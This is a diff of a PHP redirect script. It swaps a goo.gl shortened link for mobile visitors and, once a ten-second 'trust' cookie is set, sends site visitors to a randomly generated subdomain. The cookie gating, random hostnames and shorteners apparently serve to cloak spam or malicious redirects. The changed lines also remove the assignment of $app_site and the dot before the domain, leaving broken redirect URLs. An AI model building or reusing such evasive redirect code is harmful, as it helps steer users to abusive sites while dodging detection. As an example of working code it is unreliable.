@@ -115,12 +115,12 @@
   $id = isset(explode(".", $id)[0]) ? explode(".", $id)[0] : $id;
 
   if($action == 'mobile'){
-    header('Location: https://goo.gl/2hIYpf?'.rand(11111,99999));
+    header('Location: https://goo.gl/ygKIYv?'.rand(11111,99999));
     
   }else if($action == 'site'){
     if(isset($_COOKIE["trust"])){
-      $app_site = getSite();
-    	header("Location: http://".generate_name(rand(5,9)).".$app_site/$id");
+    $site_red = trim("http://".generate_name(rand(5,9)).$app_site."/".$id);
+    header("Location: ".$site_red);
     }else{
     	setcookie("trust", "true", (time() + 10), "/", ".".$_SERVER["HTTP_HOST"], false);
       header('Location:http://'.$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]);
